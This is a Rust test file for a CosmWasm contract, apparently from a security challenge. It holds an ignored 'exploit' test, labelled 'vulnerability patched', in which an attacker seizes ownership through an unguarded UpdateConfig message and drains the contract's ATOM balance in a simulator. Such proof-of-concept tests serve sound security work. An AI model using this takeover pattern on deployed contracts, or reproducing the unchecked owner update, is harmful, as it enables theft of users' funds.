#[cfg(test)]
pub mod tests{

    use cw_multi_test::{ContractWrapper, Contract, App, Executor};
    use cosmwasm_std::{coin, Addr, Empty, QueryRequest, BankQuery, to_binary, Querier, BalanceResponse, from_binary, Coin};

    use crate::msg::{InstantiateMsg, ExecuteMsg, QueryMsg, OwnerResponse};

    pub const ATTACKER : &str = "attacker"; 
    pub const DENOM : &str = "ATOM"; 
    pub const OWNER : &str = "owner"; 

    fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }
    fn query_balance_native(app: &App, address: &Addr, denom: &str) -> Coin {
        let req: QueryRequest<BankQuery> = QueryRequest::Bank(BankQuery::Balance { address: address.to_string(), denom: denom.to_string() });
        let res = app.raw_query(&to_binary(&req).unwrap()).unwrap().unwrap();
        let balance: BalanceResponse = from_binary(&res).unwrap();
    
        return balance.amount;        
    }
    fn mint_native(app: &mut App, beneficiary: String, denom: String, amount: u128) {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: beneficiary,
                amount: vec![coin(amount, denom)],
            },
        ))
        .unwrap();
    }
    
    #[ignore = "vulnerability patched"]
    #[test]
    fn exploit(){
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());
        
        // init contract
        let msg = InstantiateMsg {
            owner: OWNER.to_string(),
        };
        
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(OWNER),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();
            
        
        mint_native(&mut app, contract_addr.to_string(), DENOM.to_string(), 100);
        
        app.execute_contract(
                Addr::unchecked(ATTACKER), 
                contract_addr.clone(), 
                &ExecuteMsg::Withdraw{destination: ATTACKER.to_string()}, 
                &[]
            ).unwrap_err();

        app.execute_contract(
            Addr::unchecked(ATTACKER), 
            contract_addr.clone(), 
            &ExecuteMsg::UpdateConfig { owner: ATTACKER.to_string()}, 
            &[]
        ).unwrap();

        let owner : OwnerResponse = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::Owner {},
            )
            .unwrap();
        
        assert_eq!(owner, OwnerResponse { owner : Addr::unchecked(ATTACKER) } );

        app.execute_contract(
            Addr::unchecked(ATTACKER), 
            contract_addr.clone(), 
            &ExecuteMsg::Withdraw{destination: ATTACKER.to_string()},
            &[]).unwrap();
        
        let balance = query_balance_native(&mut app, &Addr::unchecked(ATTACKER), DENOM);
        assert_eq!(coin(100, DENOM), balance);

    }
}